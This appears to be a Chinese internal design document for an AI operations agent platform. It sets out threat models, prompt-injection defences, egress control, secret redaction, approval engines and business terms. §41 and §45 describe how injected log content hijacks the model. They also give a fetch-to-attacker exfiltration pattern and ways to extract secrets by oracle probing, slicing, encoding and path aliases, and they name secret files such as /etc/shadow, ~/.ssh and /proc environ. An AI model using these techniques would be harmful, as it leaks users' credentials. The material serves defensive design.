1. **账号隔离**：自纳入 connector 用独立 OS 账号（如 `aiops-agent`）；平台服务进程跑在另一账号下，配置文件/compose/.env 权限 600 仅服务账号可读——隔离的意义是"读不到能删日志的钥匙"，不是"没权限删日志"。
2. **DB 角色拆分（真正的闸门）**：审计表独立 DB 角色，仅授 INSERT/SELECT，不授 UPDATE/DELETE——追加即定稿，数据库授权体系与 OS 无关。主服务日常写操作用普通角色。
3. **异机存证（防毁灭性攻击）**：审计日志实时推送一份到平台之外（远程 syslog/对象存储 append-only）。企业版做成"审计外送"配置项。

### 40.4 注册账号层级

自纳入账号建在宿主机层面（容器内账号无意义）；v1 自纳入 connector 即"本机 exec + 独立账号"，不引入容器复杂度。

## 41. 威胁模型三对手与"注入后果封顶"（2026-10-21 定稿）

"Agent 被攻破"一词混了三件事，分开定对手：

1. **服务器被攻破**：出界。root 已在别人手里，Agent 防不防无差别。Agent 唯一责任是**限制爆炸半径**：回连凭证不能成为跳到控制面、再跳到其他服务器的梯子（按主机签发、绑定主机身份、可单独吊销）。
2. **Agent 进程被外部打穿**（RCE）：低概率。纯出站、不监听、静态编译，攻击面同普通守护进程，不围着它设计。
3. **模型被内容劫持（提示注入）**：**必然发生**。模型读的日志/配置/报错/网页全是不可信输入，模型分不清"用户说的"和"日志里写的"。攻击者往 nginx 发一个 User-Agent 带"排障备注"的请求即可进入上下文，不需碰服务器。这**不等价于用户恶意操作**——用户指令正常，AI 是被骗。

设计结论：**不争注入概率，让注入后果不重要**。四道闸已建立在"模型每一次输出都可能被劫持、全部由确定性代码校验"之上；此前缺两块，补齐即闭合：

- **出口控制**：脱敏是减量不是墙。模型可见的业务信息（内网 IP、主机名、表名、邮箱）可被拼进 `fetch("https://攻击者/?q=...")` 带出。模型不得有自由外联：域名白名单，或只给受控搜索工具不给自由 fetch；fetch 同时防 SSRF（云元数据、DNS 重绑定）。
- **白名单副作用审计**：闸1 只读工具必须**既不联网、也不派生子进程、也不读会间接执行的配置**（kubectl 认证插件、PAGER、git hooks 等）。审的是工具副作用，不是命令名。v1 倾向暴露 `read_recent_logs` 类专用工具，不给模型自由拼 CLI 参数。内核能力（seccomp/netns）是兜底不是主防线。

数据流泄露点只有两处：脱敏前（数据只在 Agent 内存，出口只能是命令本身，靠无副作用白名单堵）；脱敏后（靠外联控制堵）。

## 42. 密钥发现即凭证化（2026-10-21 定稿）

替代"打码/明文"二态：只读工具拉回的内容中，凡被黑名单规则命中的片段，**在 Agent 侧直接创建命名凭证**，三方视角分离：

- 对 AI：永远是 `cred:<name>`，附注释；
- 对用户：凭证库里看到名字、注释、发现位置、使用记录，可改名/改注释/否决；
- 对执行层：真正拿明文做替换注入。

**明文只存在服务器侧 Agent**，控制面仅有名字与元数据——"密钥从未离开用户机器"，数据主权口径由此成立。顺带产品功能："在你的服务器上发现 N 处明文密钥，已托管"=安全资产盘点。

### 42.1 落地五口子

1. **凭证绑水槽**：凭证只能注入到声明过的目标（主机 X 上的白名单工具 Y 的参数 Z），注入目标工具本身不联网。否则 AI 被骗后"把 cred 注进 curl"即是换名外泄。
2. **注入后输出二次脱敏**：工具回显参数、`--verbose`、数据库报错带连接串都会把明文吐回上下文。Agent 回传前用凭证明文做**精确匹配打码**（比正则可靠）。
3. **误报一键否决**：git hash、trace id、base64 会被正则误判，用户点"这不是密钥"即释放，否则卡片轰炸→用户关功能。
4. **解密卡片为逃生口**：极少数需真读明文的场景（比对 key、看证书内容）走审批卡片，卡片明示代价（明文将发往模型供应商）；**解密即断外联**——该任务外联自动关闭或升级为需审批，带 TTL、按条按任务，不做全局开关。
5. **优先"AI 不碰明文"路径**：多数"紧急拿密钥"实为"用密钥做事"（连库、调接口），走注入，模型全程不见明文。

### 42.2 黑名单规则的产品形态（用户三问定稿）

**一、匹配手段与颗粒度**：正则只覆盖"有固定格式的东西"（token/key/连接串/几乎每台机都有的涉密文件如 `/etc/shadow`、`~/.ssh/*`、`.env`）。用户自定义文件名的涉密文件无法靠格式识别，补三类规则：

- **格式规则**（正则，系统预置+用户追加）：匹配内容片段，命中即凭证化；
- **路径规则**（glob，用户配置）：命中即**整文件按涉密文件处理**（整体凭证化为一个"文件凭证"，AI 只拿到文件名、大小、用户注释；需要用时注入到白名单工具的文件参数，如 `--config @cred:file`），解决"文件里全是 url/指令/密码、无固定格式"的问题；
- **文件标记**（可选）：用户在文件旁放 `.aiops-secret` 标记或在凭证库登记路径，等价于路径规则。

颗粒度：黑名单**全局生效、对所有 AI 角色一致**（守门人不按角色打折，角色只决定能做什么、不决定能看什么）。"同名文件有的敏感有的不敏感"不靠角色解，靠路径规则精确到主机+路径，再加误报否决。默认不做更细颗粒度，复杂度不值。

**二、凭证命名与注释**：由 AI 在发现时**根据上下文命名并写注释**（如 `prod-mysql-root / 从 /opt/app/config.yml 的 db.password 发现，用于 mysql 客户端连接`），用户在凭证库可改名改注释；后续 AI 按名字+注释挑选凭证。命名规则：`<环境>-<系统>-<用途>` 建议格式，系统保证唯一性（冲突追加序号），发现位置与首次任务 ID 作为不可改元数据。文件凭证同理命名，注释由 AI 概括文件用途（概括本身基于明文，在 Agent 侧完成，仅注释回传，注释再过一遍脱敏）。

**三、可关闭性**：**可关闭，但不是开关，是审批**。标准生产默认全开；"文档很乱、就是要 AI 整理并输出关键信息"的场景确实存在，处理为：用户对**特定任务、特定路径范围**发起"明文读取"授权（走闸3/闸4 同一审批原语，卡片明示将把这些内容发给模型供应商），授权带 TTL，期间该任务外联关闭（同 42.1 第 4 条）。不提供全局永久关闭：全局关闭=放弃本节全部保障，而且企业版审计需要留下"谁在何时放行了什么"的记录。个人版可提供"信任模式"全局开关，但明示风险且审计照记。

### 42.3 与已有章节关系

替代 §"凭证抽象(默认全无显式开)"中的一次性 `{{SECRET}}` 占位符方案，占位符保留为凭证的注入语法；"AI 不碰身份"由此有了落地路径。黑名单与闸1 只读工具一体实现，在 Agent 侧执行，控制面不见明文。

## 43. 整体执行架构串联（2026-10-21 定稿）

### 43.1 三模式（只读 / 审计可写 / 放权）
- 用户每次任务选一个模式，软件层硬限制 AI 可见工具集。**模式在任务启动时固化**，中途不可切换（防只读阶段被注入的上下文带进写阶段），切模式=新任务。
- 放权模式必须存在（告警自愈等无人值守场景），但其语义见 43.5：不是"全放行"，是"审批策略切换"。

### 43.2 AI 的工具面
核心工具两个：**只读工具**（闸1，专用读工具，不给自由拼参数）与**写工具**。其他工具：交互卡片、受控 web 搜索（无自由 fetch，见 §41）、平台业务 API（trigger/告警/文档，见 §40.1）。

**写工具唯一语义是 `propose_change(变更集)`——提交，不执行。** 执行在服务端策略引擎：审计模式挂起发卡片、人批后执行、结果作为新事件回给 AI；放权模式引擎自动批准立即执行。AI 不知道、也无需知道当前模式，"必须申请"不是 AI 的选择而是工具本身的语义。

### 43.3 白名单两套、黑名单管双向
- 只读白名单（闸1 工具及其副作用约束）与写动作表（闸3）**分开维护**。白名单管出去的操作，黑名单管回来的信息。
- **写操作回执必须过黑名单**：报错带连接串、重启打印环境变量、verbose 回显均会漏明文。处理同只读：Agent 回传前凭证明文精确匹配打码+正则。回执主要是退出码/状态行，对使用几乎无影响。
- **写入方向同样封口**：AI 改配置/设密码只能写 `cred:xxx` 引用，Agent 执行时替换（§42 注入语法）。

### 43.4 账号与自纳入
- 每台受控机注册时配置执行账号；主服务部署时**默认注册本机为自纳入 connector**（§40.2 已定稿，此前反对的是用它替代平台自监控，不是反对其存在），否则 AI 连宿主机都不能操作、体验断层。
- 平台自保护 v1 基线：**核心文件 600 属服务账号 + 部署时提示执行账号不用 root**。AI 账号读不到 compose/.env → 拿不到 DB 凭据 → 删不了审计，够用，不再加重。仅保留 §40.3 第 2 条：审计表独立 DB 角色仅 INSERT/SELECT（一行 GRANT，是配置不是功能）。
- 联邦运维（本机同时受另一主服务控制）由同一机制自动覆盖：对方 Agent 账号同样非 root，文件 600 属本机服务账号。
- 非 root 账号的特权动作（重启服务等）走闸4 sudoers，仅放具体命令不放 shell。

### 43.5 策略引擎：一张动作表，不是多套白名单
按模式各做一套白名单会随模式×主机爆炸。改为：
- **一张动作表**，每个动作带属性 `auto_approvable`（或风险等级）及适用主机范围。
- **放权模式 = 标了 auto_approvable 的动作直接执行，未标的照旧走审批。**
- **触发源收窄**：告警规则/自愈任务绑定自己的动作子集（磁盘告警只能触发清日志/扩容，不能重启数据库），按触发源缩范围，不另建白名单。
- 引擎输入 =（模式, 动作, 触发源, 主机），输出 =（直接执行 / 发审批 / 拒绝）。所有"谁能在何时不经人做什么"只改这张表，43.2 与本节合为同一引擎。

## 44. 黑白名单的产品形态与模式绑定（2026-10-21 定稿）

### 44.1 名单=不可变快照
- 两张默认名单（只读工具白名单、写动作表）+ 黑名单，均为可视化配置表，平台预置并默认开启，带版本号。
- 每个名单有唯一 ID；**被任何任务引用过即冻结**，编辑=基于某版本 fork 出新 ID（记录 `parent_id`，审计可顺 diff 追溯"谁何时加了哪条规则"）。原名单不可覆盖、不可删除（审计需求）。
- 平台升级发布新默认版本时**不自动改绑**，但主动提示"默认名单有新版本，含 N 条新规则，查看 diff / 一键改绑"，保证安全更新能到达用户。
- 规则内部可带主机标签作用域（`hosts: [tag:prod]`），名单本身全局；机器差异在规则里表达，审计仍只记一个 ID。（取代 §43.5 末尾"按主机覆盖"的悬而未决。）

### 44.2 冲突裁决与检测
- 平台做**机械检查**：正则合法性与灾难性回溯（超时测试）、glob 路径存在性、死规则（被更宽规则完全覆盖）、真冲突（allow/deny 命中集相交）。不做语义判断（"此文件该不该算敏感"是用户业务判断）。
- 裁决固定一条：**禁止优先于允许**。黑名单命中即打码；白名单 deny 覆盖 allow。
- 检测按钮=**干跑**：选一台主机或粘贴样本文本，按该名单干跑只读采集，只返回命中统计与脱敏后片段预览，不返回明文；白名单输入候选动作返回被哪条规则允许/拒绝。
- 不合规绑定在**保存时拒绝**：只读模式绑含副作用工具的名单→拒绝；放权模式绑无 auto_approvable 动作的名单→允许但提示"实际退化为审计"。

### 44.3 名单绑模式，模式每轮选
- **黑白名单绑定在模式上**（只读/审计可写/放权各绑一组名单 ID），不按角色设默认（角色不再多一层绑定）。改名单场景少，多在 trigger 配置时改；切模式场景多，放在聊天每轮。
- 用户每轮选模式，不选则**默认延续本会话上一轮**（按会话作用域，不跨角色/会话继承）；**放权不继承**，每次必须显式选择。
- 审计记录每轮固化三元组 `(模式, 只读名单ID, 写名单ID)`+触发源，任务启动时固化（§43.1），改绑只影响新任务；UI 需提示"当前 N 个任务仍在用旧名单"。
- **trigger 任务模式必填、不默认**，无人值守任务不靠继承。
- 一会话跨多机：模式/名单任务级，机器差异在规则作用域。只读→审计继续：新任务，只读结论作为上下文带入，但重新过注入校验。

## 45. 对 §41-44 的自挑刺与补丁（2026-10-21 定稿）

### 45.1 阻断项（实现前必须进设计）
1. **预言机攻击**：AI 可控谓词的读工具（grep/wc/ls -l/find）若作用于原文、仅结果打码，可逐字符二分猜出密钥。规则：**AI 提供的任何谓词只作用于已脱敏内容**；凭证化区域的长度/大小等元数据返回固定值。
2. **切片与变换绕过**：head/tail 偏移切片、base64/xxd/cut/rev 变换均使正则失效。规则：**所有只读工具运行在"脱敏视图"上**——Agent 先整读整段脱敏/凭证化，工具再作用于脱敏后内容，变换也变不出明文，因此不需要禁工具；仅禁止能直接打开原始 fd 的途径（AI 自写脚本读文件，本就不在白名单）。（2026-10-21 修正，原"禁止一切内容变换工具"表述过头）
3. **路径别名绕过**：`/etc/./shadow`、软/硬链接、bind mount、`/proc/*/environ|cmdline`。规则：匹配前 **realpath 规范化**；`/proc`、`/sys`、`/dev/shm` **默认进脱敏范围（可读，但强制黑名单+凭证化，不因路径规则未命中而漏过）**——排障需要看进程环境/cmdline，而容器应用密钥多在环境变量。shadow 哈希虽不可直接反解但可离线暴破，且 root-only 文件非 root 执行账号本就读不到，列入成本为零。
4. **凭证统一存主服务（2026-10-21 二次修正）**：此前"明文仅存 Agent 侧"忽略了 connector 模式（SSH/K8s/云 API 由主服务直连，输出回到主服务才脱敏，明文必然进主服务内存）。主权口径修正为**"明文不离开用户基础设施、不经过我们、不发给模型厂商"**——主服务本就部署在用户机器上，故凭证明文加密落库于主服务（密钥在主服务本机），Agent 侧不持久化。执行 Agent 模式先在 Agent 侧脱敏（减量），connector 模式在主服务 connector 出口脱敏；**两路在"进模型上下文之前"同一层汇合，此为真正边界**。凭证统一页面管理，全角色可见名字/注释/发现位置/所属主机，新发现自动注册带"新发现"标签，用户可删/永久化；跨主机注入 v1 直接支持。企业版 vault 改为对接外部 KMS/Vault 的集成项。推论：主服务为最高价值目标，§40.3/§43.4 的 600+非 root+审计表 INSERT-only 由"够用"升为**必须**，凭证表另设独立 DB 角色仅主服务进程可用。
5. **闸3 卡片实现约束：主体=引擎从变更集渲染的实际命令/diff/目标主机**，AI 摘要仅为附注（否则用户批的是 AI 叙述而非引擎将执行之物）；闸4 默认全通过；审批哈希绑定变更集+目标稳定身份（容器 ID/资源 UID/文件 inode），不只绑命令文本。

### 45.2 产品层补丁
6. **平台基线黑名单**：公认涉密项（shadow、ssh 私钥、云凭证、常见 token 格式）由平台维护、始终叠加于用户名单之上、独立版本号、随平台升级自动生效；审计同时记基线版本 ID。用户名单只做增量，解决"冻结名单导致安全热修到不了用户"。
7. **放权模式爆炸半径（兜底，白名单管"能做什么"，此项管"能做多少"）**：告警载荷亦为不可信输入。trigger 三个可选字段 **每次触发最多 N 动作 / M 主机 / 冷却时间**，超限自动降级为审批。
8. **审批人身份与防重放（企业版/多用户，开源版不做）**：开源版单用户，拿到机器人即用户，属部署边界。企业版：校验审批人授权、审批一次性、带 TTL、绑定变更集哈希。

### 45.3 已接受的残余风险
- 未被正则/凭证库覆盖的新密钥出现在回执中会泄露——正则固有上限，靠基线名单迭代，不宣称零泄露。
- AI 给凭证起误导性名字——凭证库人工复核兜底。
- Agent 账号读不到的文件发现不了——与"非 root 执行账号"一致，需读 root 配置走 sudoers 单条读授权。

## 46. 凭证存放两档与明文唯一展示面（2026-10-21 定稿，覆盖 §45 第 4 条）

### 46.1 按通路两档
- **执行 Agent 模式（推荐）**：明文只存受控机 Agent 本地（加密文件）。主服务凭证库仅存**句柄**（名字/注释/所属 Agent/权限）；注入时主服务持句柄调用 Agent，Agent 本地替换。联邦下多台主服务持同一句柄，均无明文——防秘密散落各地。
- **connector 模式（降级路径）**：无 Agent，明文物理上必进主服务，加密落库于主服务。仅用于装不了 Agent 的云资产；产品明示推荐 Agent。
- 对外承诺分两级且均为真："Agent 管的机器，密钥不出这台机器；connector 管的机器，密钥不出你的主服务。"

### 46.2 受控机自主权（Agent 模式独有）
Agent 机器可销毁本地凭证、吊销某台主服务的回连授权、拒绝任务——被管方持否决权，是联邦/"他人主服务管我机器"场景的信任落脚点。connector 机无此能力，为推荐 Agent 的硬理由。
Agent 重装/丢失→本地凭证随之消亡，主服务句柄悬空，为正确行为；UI 标"句柄失效，待重新发现"。

### 46.3 明文唯一展示面=凭证页
AI 只持 `cred:xxx`，无明文可显示，对话与日志落盘的只有句柄；"帮我拿 token"的正确结果=发现→托管→告知名字，用户到凭证页查看（有权限与审计）。
唯一明文进对话的路径是解密卡片（§42.1-4）：卡片代价说明加"明文将出现在模型上下文与对话记录"；**解密后的 AI 回复落盘前二次脱敏**（凭证明文精确匹配打码），对话仍显示句柄。对话永远不是明文展示面。

## 47. 执行 Agent 侧凭证存储与 own/合作模式（2026-10-21 定稿）

### 47.1 存储
- Agent 无前端。服务目录下 `credentials.json`（600，Agent 账号属主）存发现的凭证注册信息；字段值用 Agent 本机密钥加密（密钥文件亦 600），目的为防备份/快照无意外泄，非防 root。
- 每条：`id / name / note / source(发现位置) / created_task / share{<master_id>: bool}`。`share` **按主服务 ID 逐一放行**，默认无条目=不同步。

### 47.2 两种回连模式（属于每条 Agent↔主服务配对，非 Agent 全局）
- **own**：本机属于该主服务所有者，凭证明文自动同步到主服务统一管理（Agent 本地仍留一份，主服务离线时自愈任务照跑）。每台 Agent 最多一个 own 主服务。
- **cooperative（合作）**：对该主服务保留不信任，默认只给句柄；需在 Agent 本机逐条 `share` 放行才同步明文。
- 发现、脱敏、注入在两种模式下都在 Agent 侧完成，模式只决定明文是否上行。

### 47.3 操作面=本机 CLI
`aiops-agent register --master <X> --mode own|cooperative`、`cred list|share <id> --to <master>|revoke|destroy`。不做 TUI/页面。**只能在本机操作**=自主权的物理体现。
- own 只能在 Agent 侧授予，主服务无法自升级为 own。
- own→cooperative 切换不能撤回已同步明文，CLI 明示并建议轮换。
- 同步走既有 mTLS 回连通道，不新开接口。

## 48. 脱敏视图实现思路（2026-10-21）

核心：**脱敏发生在"读文件/读流"那一步，不在"工具输出"那一步**。只读工具不直接碰磁盘，所有读取经唯一中间层（脱敏视图）：
1. 整文件读入 Agent 内存 → 2. 跑黑名单：正则命中片段→`cred:xxx`（同时注册凭证，同一明文复用同一 ID）；路径规则命中→整文件替换为"文件凭证 cred:file-xxx" → 3. grep/head/wc/cat 等工具作用于脱敏后内容 → 4. 回传无需再打码。
- 流（journalctl/docker logs/ps）分块脱敏，块间保留重叠窗口（≥最长正则可匹配长度）防密钥跨块。
- 元数据脱敏：凭证化文件的大小/字节数返回固定值。
- 大文件上限（如 50MB）以上强制流式路径；基线规则预编译为合并自动机单次扫描。
- 接口 `read_sanitized(path)` / `stream_sanitized(source)`，所有只读工具与 connector 出口只准走此接口，不准直接 open——代码审查一眼可查。

## 49. 企业版承诺、责任边界与开源保护（2026-10-21 定稿）

### 49.1 原则：按"责任边界能否用文字写清"分档，不按"是否担责"分档
- **档 1 部署+培训**：责任止于软件缺陷。按人天，入场券，无复利。
- **档 2 规则定制+验收（主力）**：交付黑白名单快照、动作表、trigger 配置、凭证托管方案、运维手册。**交付物是可被机器验证的表**：验收=测试用例集（N 条命令必须拒/放行、M 个样本必须脱敏）全绿签字。责任边界="在名单 ID=xxx 下引擎行为与验收用例一致"；"该不该放行某动作"为客户业务判断，签字即其承担（§44 平台不做语义判断，合同照抄）。名单不可变快照+审计三元组=我们的免责证据链——**安全架构即责任架构**。
- **档 3 担运维结果（SLA 赔付）**：不做。控制不了客户变更流程/值班/人员就不承诺，本质是保险业务，同 §28-35"深水 SRE 不接"。

### 49.2 规则定制的产品化
基线名单（平台自带）+ 行业模板（K8s/LNMP/Java 微服务栈，首单沉淀后复用 70%）+ 客户特有（§44 干跑在客户机上跑出来）。报价按从零定制，成本按模板改动，差额即利润。**行业模板与验收用例集不开源**，是核心商业资产。

### 49.3 合同四条
1. 责任范围明确到名单 ID 与验收用例集，不写"保证安全"。
2. 客户 fork 新名单后对新 ID 不担责，除非走我方变更评审（续费点）。
3. 模型上游问题（降级/幻觉）非我方责任，§25 降级链为尽责证明。
4. auto_approvable 清单由客户签字；§44 放权不继承、§45 爆炸半径为我方提供的刹车，刹车失效才是我方责任。

### 49.4 定价（修正：按能验收的范围报，不按行业天花板报）
- 前 1–3 单：5–15 万，明说"首批客户价"，目标是拿模板+案例+用例集，亏时间不亏钱。
- 有模板后：20–40 万。
- 百万级：多环境/K8s/KMS 对接/审计外送的大客户，5 个案例后再谈。

### 49.5 开源保护
- 许可证 **AGPL-3.0**：企业内部二开自用合法且无需公开（非损失，不抢客户）；改后对外提供服务必须公开改动，逼商业使用者购买商业许可。
- **双许可**：AGPL 开源版 + 付费商业许可（可闭源二开/集成）。§36 SonarQube 模式的法律基础。
- 开源版故意轻（§26）为第二道防线：二开要补的正是企业最需要的部分。
- 项目名注册**商标**：可用代码不可用名字卖。
- 接受残余：防不住不在乎开源义务且在管不到司法区的人，但其无更新流/模板/案例，非客户亦非对手。

## 50. 订阅产品线重定义：安全情报订阅（2026-10-21 定稿，覆盖 §28 "Skills 订阅脆弱"）

### 50.1 推翻理由
§28 否定基于"Skills 文件落盘挡不住"。修正：**卖的不是文件，是持续服务流**——落盘无妨，下月的更新用户没有。订阅由"卖内容"变为"安全情报 + 自动巡检提醒"。

### 50.2 内容
- **核心：盯上游安全更新**。维护"常见镜像/软件 → 版本 → 已知高危 CVE"映射，推送至 Agent；AI 巡检时主动提示"nginx 1.26.1 有 CVE-xxxx，建议升级，是否生成变更集"，走闸3 审批。
- 附带：优选镜像源（可按版本路径区分订阅期，但**不作惩罚性门锁**——制造痛感会唤醒用户评估是否续费；懒得关自动续费的前提是没感到痛）。
- v1 只盯**高危 + 有公开利用 + 影响默认配置**的 CVE，宁少勿错；误报两次用户即关（同 §44 误报原则）。

### 50.3 为什么成立
- **体验后付费**：用户装开源版→被提醒一次→真修了漏洞→才问价格。15 元/月便宜到不值得犹豫。
- **边际成本近零**：一人盯 200 个常见镜像，服务 100 或 10000 用户成本相同，真 SaaS 结构。
- 多数用户宁愿花 15 元买安心不管，个人用户亦然。

### 50.4 数据主权兼容
Agent 本地算指纹（镜像名+版本哈希），上行仅问"这些有漏洞吗"，不上行主机名/IP/配置。订阅服务只知"有人用 nginx 1.26.1"。

### 50.5 定价与预期
15 元/月（180 元/年）。三年目标稳定 ~400 付费用户 ≈ 20 万；区间上修至 10–30 万，升级为**独立产品线**，命名避免"Skills"（用户不懂），用"有人替你盯漏洞"类直白名称。

### 50.6 下发形态：按需下发 + 有效期缓存（修正 §28 "落盘物理必然"）
- §28 用词有误：Skills 内容非必然落盘，可按需拉取入内存上下文、用完即丢。准确表述：**内容必然出现在客户端内存，用户有心即可获取**（抓包/打印上下文），不落盘只挡复制文件。
- 防护目标定准：**不防个人自用抓取**（拿到的是本月版本，次月仍需拉，为省 15 元抓包者本就不付费）；**防批量拉取转卖/做竞品**——授权绑定（订阅校验 + Agent 签名）、限速（单 Agent 日拉取量拉不完全库）、不可见账号水印、服务条款。均为常规手段。
- 按需下发是 §50 实时性要求的自然形态（CVE 情报本就该每次最新），防盗为副产品。
- 过期行为=自然降级而非门锁：拉不到即提示"情报订阅已过期，仅做基础检查"。
- 离线：保留带有效期的本地缓存，断网用缓存、联网刷新；缓存是实现细节不是交付物。**真正的锁是"下个月的内容在我们手里"**。

## 51. 能力分层与"弹卡放行"的适用边界（2026-10-22 定稿）

### 51.1 起因：把三种"AI 出事"拆开
用户主张"Agent 侧被攻破近似不可能事件，不如直接假设服务器被攻破"。此判断把三类不同概率的事件压成了一个词，需要拆开：

| 形态 | 性质 | 概率 | 靠什么防 |
|---|---|---|---|
| 模型判断错误 / 被提示词注入 | 语义层，模型必然犯错 | **必然事件，不是假设** | 白名单、变更集、审批、能力收敛（§41-44） |
| Agent 进程被攻破（RCE、依赖漏洞、JSON/参数解析缺陷） | 代码层 | 小概率但**非不可能**：它是个解析外部输入并执行命令的 HTTP 服务，处于客户内网攻击面 | 进程权限上限（§51.3）、最小能力、不因"概率低"而免设计 |
| 服务器 root 被拿 | 宿主层 | 属于信任边界之外 | 不在本设计承诺范围；带外通道另议（host-down-resilience.md） |

结论：防注入虽是第一优先，但不能用"注入是主要威胁"推出"进程被攻破可忽略"。两者的防护手段不重叠：**即使模型完全听话，进程被打穿后模型的一切自我约束都失效。**

### 51.2 关键区分：内核隔离是加固，能力上限是设计
- 用户抗拒依赖 Linux 内核特性抵抗越界——成立。内核对 Agent 做隔离（namespace/seccomp/eBPF 出站限制）列为**可选加固**，不进第一版验收。
- 但"进程被攻破后能做什么"必须在设计阶段封顶。这不是内核问题，是**能力收敛问题**：不把一个进程放得能执行命令 + 任意出网，再指望它自己守规矩。

### 51.3 三层能力，只有两层可以被"弹卡放行"
| 层 | 内容 | 可否由用户弹卡放行 |
|---|---|---|
| 读服务器 | 只读工具 + 白名单 argv（§41） | **可以**。用户看到的是"AI 要读这个"，判断对象明确 |
| **外联** | 抓网页、调外部 API、发邮件/Webhook、任何出站 HTTP | **永久禁止**。只能走静态出站白名单（§43），无任何运行时放行入口 |
| 写操作 | propose_change + 策略引擎 + 审批（§44） | 必须审批；审批语义见 §51.4 |

**外联为何不能弹卡**：外联弹卡等于让用户批准"把数据发到某地址"，而用户在此刻没有能力判断这个地址意味着什么（攻击者域名、DNS 重绑定、云元数据 169.254.169.254 都长得像正常 URL）。更现实的是——弹卡会被点成习惯，一个每天出现十次的确认等于没有确认。因此：**外联能力只能由管理员在配置里静态授予，永不接受模型或被攻破的进程在运行时索取。**

### 51.4 敏感内容"解锁"弹卡（用户提议，采纳并限定）
用户提议：黑名单模糊处理命中后，弹卡片问用户是否解开原文（紧急取密钥排障）。
- **采纳**：脱敏视图（§48）命中时产生 `sensitive_hit` 事件，界面给出解锁卡；解锁是**人类对人**的动作，AI 无法自行触发（模型无此工具），解锁后原文仅在本次读取的这一条结果中返回。
- **限定 1**：解锁只对"读"生效，不授予任何写/外联能力。
- **限定 2**：解锁动作本身进审计（who/when/which rule/which file），且每次解锁是一次性、不持久（下一条读取重新脱敏），防止"解锁一次全局降级"。
- **限定 3**：可配置为需二次确认（输入文件名）；企业版可要求双人。
- 边界说明：此机制解决的是"AI 本不该看但人同意看"，**不解决**"AI 自己想到一个外联请求"——后者由 §51.3 的永久禁止覆盖。

### 51.5 实现顺序
1. §51.3 的三层能力在工具表（§44 动作表 / §45 只读工具结构）中显式标注 `capability: read | write | egress`；`egress` 类工具不得出现在"待审批可放行"的集合里。
2. `sensitive_hit` + 解锁卡纳入阶段 6 之后的治理台页面（沿用 inbox 卡片模型，新增一种卡片类型）。
3. 内核对 Agent 的隔离写在加固清单，不作为上线门槛。
